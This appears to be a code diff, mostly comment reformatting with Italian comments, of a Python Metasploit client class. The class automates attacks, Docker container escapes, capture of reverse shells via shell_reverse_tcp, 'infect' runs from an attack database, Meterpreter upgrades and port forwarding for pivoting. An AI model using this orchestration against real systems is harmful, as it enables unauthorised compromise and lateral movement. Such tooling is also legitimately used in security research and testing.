@@ -16,7 +16,7 @@ class MetaClient:
     READ_CONSOLE_BUSY_ATTEMPTS = 5
 
     
-    #Viene creata un istanza di client Metasploit che si connette al server con password porta e ip specificati
+    # Viene creata un istanza di client Metasploit che si connette al server con password porta e ip specificati
     def __init__(self, server_password, server_port=55553, server_ip="0.0.0.0", ssl=True):
 
         self.output = ""
@@ -36,8 +36,8 @@ class MetaClient:
         self.client.consoles.console(self.cid).read()
         
     
-    #Viene chiamato il metodo execute sull'attacco attack preso in input
-    #se ha successo viene restituito l'ip della macchina bersaglio compromessa un dizionazio con le info sulla nuova sessione creata 
+    # Viene chiamato il metodo execute sull'attacco attack preso in input
+    # se ha successo viene restituito l'ip della macchina bersaglio compromessa un dizionazio con le info sulla nuova sessione creata 
     def attempt_attack(self, attack):
         sess = attack.execute()
         if not sess:
@@ -53,7 +53,7 @@ class MetaClient:
         return
     
     
-    #Vengono eseguiti massimo 5 tentativi di docker escape e se uno dei tentativi ha successo viene restituito un dizionario con la sessione creata
+    # Vengono eseguiti massimo 5 tentativi di docker escape e se uno dei tentativi ha successo viene restituito un dizionario con la sessione creata
     def docker_escape(self, docker_escape_attack_object):
         
         sess={}
@@ -70,9 +70,9 @@ class MetaClient:
         return sess
     
 
-    #questo metodo viene solo usato per il doker escape, per catturare la connessione che arriva una volta che un admin effettua una operazione di copia 
-    #sulla macchina infetta, permettendo così di farci avere una connessione sulla macchina effettuando il docker_escape
-    #restituisce la nuova sessione creata se il docker-escape ha successo
+    # Questo metodo viene solo usato per il doker escape, per catturare la connessione che arriva una volta che un admin effettua una operazione di copia 
+    # sulla macchina infetta, permettendo così di farci avere una connessione sulla macchina effettuando il docker_escape
+    # restituisce la nuova sessione creata se il docker-escape ha successo
     def grab_docker_escape_conn(self, payload="linux/x86/shell_reverse_tcp", sleep=True):
         """
         If a new session is created it returns the ip of the compromised machine, else it returns None.
@@ -113,7 +113,7 @@ class MetaClient:
             return None
         
 
-    #Itera sugli attacchi infect presenti nell'attack_db.json e li esegue in un sottoprocesso
+    # Itera sugli attacchi infect presenti nell'attack_db.json e li esegue in un sottoprocesso
     def infect(self):
 
         
@@ -128,8 +128,8 @@ class MetaClient:
     
             
 
-    #Gestisce il processo di aggiornamento di una shell a una shell Meterpreter 
-    #restituisce l'ID della sessione Meterpreter se l'aggiornamento ha avuto successo
+    # Gestisce il processo di aggiornamento di una shell a una shell Meterpreter 
+    # restituisce l'ID della sessione Meterpreter se l'aggiornamento ha avuto successo
     def upgrade_shell(self, sess, sleep=True):
         self.old_sessions = None
         self.new_sessions = None
@@ -145,7 +145,7 @@ class MetaClient:
             else:
                 delay(1)
             out=self.client.consoles.console(self.cid).read()
-            print(out)
+            #print(out)
             output.append(out["data"])
         
         with time_limit(300):
@@ -175,15 +175,15 @@ class MetaClient:
             return None   
         
 
-    #Prepara il comando e richiama il metodo add_portfwd della classe client 
+    # Prepara il comando e richiama il metodo add_portfwd della classe client 
     def prepare(self, router, atk_port, exposed_port, atk_ip):
         cmd=C.ADD_PORTFWD.format(atk_ip,atk_port,exposed_port)
         self.add_portfwd(router,cmd)
         return
 
 
-    #Recupera un elenco di tutte le sessioni attive associate al client
-    #Se sleep = True aspetta prima di effettuare l'operazione
+    # Recupera un elenco di tutte le sessioni attive associate al client
+    # Se sleep = True aspetta prima di effettuare l'operazione
     def get_active_sessions(self, sleep=True):
         """
         Returns a list of open sessions associated with the client
